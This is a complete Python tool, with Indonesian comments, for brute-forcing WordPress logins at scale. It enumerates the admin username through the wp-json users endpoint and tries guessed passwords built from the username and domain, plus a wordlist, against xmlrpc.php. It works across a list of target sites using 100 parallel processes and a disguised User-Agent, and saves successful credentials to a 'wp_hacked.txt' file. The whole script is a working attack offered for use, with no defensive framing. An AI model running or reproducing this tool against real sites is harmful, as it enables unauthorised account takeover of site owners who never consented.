#                                                           Created by easycodex

import requests
import warnings
from urllib3.exceptions import InsecureRequestWarning
from multiprocessing import Pool
import sys
import signal
import argparse
from colorama import init, Fore
from urllib.parse import urlparse

# Menonaktifkan peringatan terkait SSL
warnings.simplefilter('ignore', InsecureRequestWarning)

# Inisialisasi colorama untuk kompatibilitas dengan terminal
init(autoreset=True)

# Header tambahan untuk menyamarkan aktivitas
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Content-Type": "text/xml"
}

# Fungsi untuk menangani interrupt
def signal_handler(signal, frame):
    print("\n[INFO] Program dihentikan dengan KeyboardInterrupt")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
# Fungsi untuk memastikan URL dalam format yang benar
def format_url(url):
    # Menambahkan skema jika tidak ada
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    # Menghapus trailing slash jika ada
    if url.endswith("/"):
        url = url[:-1]
    return url
# Mendapatkan username dari endpoint wp-json
def get_usernames(target_url):
    usernames = []
    try:
        target_url = format_url(target_url)
        response = requests.get(f"{target_url}/wp-json/wp/v2/users", headers=HEADERS, timeout=10, verify=False)
        if response.status_code == 200:
            try:
                users = response.json()
                user_id_1 = next((user for user in users if user.get('id') == 1), None)
                if user_id_1:
                    usernames.append(user_id_1.get('slug'))
                    print(f"{Fore.YELLOW}[INFO]{Fore.RESET} Username ditemukan di {Fore.WHITE}{target_url}{Fore.RESET}: {Fore.BLUE}{user_id_1.get('slug')}{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}[INFO]{Fore.RESET} Tidak ditemukan user dengan ID 1 di {Fore.WHITE}{target_url}{Fore.RESET}")
            except ValueError:
                print(f"{Fore.YELLOW}[INFO]{Fore.RESET} Respon bukan JSON yang valid dari {Fore.WHITE}{target_url}{Fore.RESET}")
        else:
            print(f"{Fore.YELLOW}[INFO]{Fore.RESET} Tidak dapat mengakses {Fore.WHITE}{target_url}/wp-json/wp/v2/users{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Fore.RESET} Tidak dapat mengakses {Fore.WHITE}{target_url}{Fore.RESET}: {e}")
    return usernames

# Fungsi untuk mencoba login via XML-RPC
def attempt_login(target_url, username, password):
    xmlrpc_url = f"{target_url}/xmlrpc.php"
    try:
        print(f"{Fore.YELLOW}[INFO]{Fore.RESET} {Fore.WHITE}{target_url}{Fore.RESET} Attempting {Fore.BLUE}{username}{Fore.RESET} with {Fore.BLUE}{password}{Fore.RESET}")
        payload = f"""
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
            </params>
        </methodCall>
        """
        response = requests.post(xmlrpc_url, headers=HEADERS, data=payload, timeout=15, verify=False)

        # Deteksi keberhasilan
        if response.status_code == 200 and "<name>isAdmin</name>" in response.text:
            print(f"{Fore.GREEN}[SUCCESS]{Fore.RESET} {Fore.WHITE}{target_url}{Fore.RESET} {Fore.BLUE}{username}{Fore.RESET} with {Fore.BLUE}{password}{Fore.RESET} Successfully Logged!")
            with open("wp_hacked.txt", "a") as hacked_file:
                hacked_file.write(f"{target_url}/xmlrpc.php#{username}@{password}\n")
            return True
        elif "incorrect" in response.text.lower():
            print(f"{Fore.RED}[FAILED]{Fore.RESET} {Fore.WHITE}{target_url}{Fore.RESET} {Fore.BLUE}{username}{Fore.RESET} with {Fore.BLUE}{password}{Fore.RESET} is Wrong!")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Fore.RESET} Error mencoba password {Fore.BLUE}{password}{Fore.RESET} untuk {Fore.WHITE}{target_url}{Fore.RESET}: {e}")
    return False

# Fungsi utama untuk bruteforce
def bruteforce_xmlrpc(target_url, username, password_list):
    # Ambil domain dari URL
    parsed_url = urlparse(target_url)
    domain = parsed_url.netloc
    base_domain = domain.split(".")
    if len(base_domain) > 2:
        base_domain = ".".join(base_domain[-2:])
    else:
        base_domain = domain

    # Daftar password tambahan
    custom_passwords = [
        username,  # Username sebagai password
        username + "123",  # Username dengan '123' sebagai password
        username + "12345",  # Username dengan '12345' sebagai password
        username + "123456",  # Username dengan '123456' sebagai password
        username + "1234",  # Username dengan '1234' sebagai password
        username + "@123",  # Username dengan '@123' sebagai password
        username + "@@12345",  # Username dengan '@@12345' sebagai password
        username + "_123",  # Username dengan '_123' sebagai password
        username + "2024",  # Username dengan tahun sebagai password
        username + "$$$",  # Username dengan '$$$' sebagai password
        username + "!!",  # Username dengan '!!' sebagai password
        username.capitalize(),
        username.capitalize() + "123",
        username.capitalize() + "12345",
        username.capitalize() + "123456",
        username.capitalize() + "1234",
        username.capitalize() + "@123",
        username.capitalize() + "@@12345",
        username.capitalize() + "_123",
        username.capitalize() + "2024",
        username.capitalize() + "$$$",
        username.capitalize() + "!!",
        username.lower(),  # Username dengan huruf kecil semua
        username.upper(),  # Username dengan huruf kapital semua
        username + "2024@",  # Username dengan tahun dan '@' sebagai password
        username + "!@#",  # Username dengan karakter spesial '!@#' sebagai password
        domain,  # Domain penuh sebagai password
        base_domain,  # Domain tanpa subdomain sebagai password
        base_domain + "123",  # Domain dengan '123' sebagai password
        base_domain + "12345",  # Domain dengan '12345' sebagai password
        base_domain + "123456",  # Domain dengan '123456' sebagai password
        base_domain + "1234",  # Domain dengan '1234' sebagai password
        base_domain + "@123",  # Domain dengan '@123' sebagai password
        base_domain + "@@12345",  # Domain dengan '@@12345' sebagai password
        base_domain.split(".")[0],  # Bagian utama domain sebagai password
        base_domain.split(".")[0] + "123",  # Bagian utama domain dengan angka sebagai password
        base_domain.split(".")[0] + "@@",  # Bagian utama domain dengan '@@' sebagai password
        base_domain.split(".")[0].capitalize(),  # Bagian utama domain dengan huruf kapital di awal
        base_domain.split(".")[0].lower(),  # Bagian utama domain dengan huruf kecil semua
        base_domain.split(".")[0].upper(),  # Bagian utama domain dengan huruf kapital semua
        base_domain + "2024",  # Domain dengan tahun sebagai password
        base_domain + "!@#",  # Domain dengan karakter spesial '!@#' sebagai password
        base_domain + "!"  # Domain dengan karakter spesial '!' sebagai password
    ]

    # Coba custom password terlebih dahulu
    for password in custom_passwords:
        if attempt_login(target_url, username, password):
            return True

    # Coba password dari pwd.txt
    for password in password_list:
        if attempt_login(target_url, username, password):
            return True

    return False

# Menjalankan bruteforce untuk setiap URL
def run_brute(target_url, passwords):
    usernames = get_usernames(target_url)
    if not usernames:
        return
    for username in usernames:
        print(f"{Fore.YELLOW}[INFO]{Fore.RESET} {Fore.WHITE}{target_url}{Fore.RESET} Username Found: {Fore.BLUE}{username}{Fore.RESET}")
        bruteforce_xmlrpc(target_url, username, passwords)

# Fungsi utama
def main():
    parser = argparse.ArgumentParser(description="WordPress XML-RPC Brute Force Tool with Custom Passwords")
    parser.add_argument("url_file", help="File yang berisi daftar URL target (contoh: sitelist.txt)")

    args = parser.parse_args()

    # Membaca file URL
    try:
        with open(args.url_file, 'r') as url_file:
            urls = url_file.read().splitlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR]{Fore.RESET} File {Fore.WHITE}{args.url_file}{Fore.RESET} tidak ditemukan.")
        sys.exit(1)

    # Membaca file password
    try:
        with open('pwd.txt', 'r') as pwd_file:
            passwords = pwd_file.read().splitlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR]{Fore.RESET} File {Fore.WHITE}pwd.txt{Fore.RESET} tidak ditemukan.")
        sys.exit(1)

    print(f"{Fore.YELLOW}[INFO]{Fore.RESET} Memulai proses bruteforce dengan multiprocessing...")
    with Pool(100) as pool:
        pool.starmap(run_brute, [(url, passwords) for url in urls])
        pool.close()
        pool.join()

    print(f"{Fore.YELLOW}[INFO]{Fore.RESET} Bruteforce selesai.")

if __name__ == "__main__":
    main()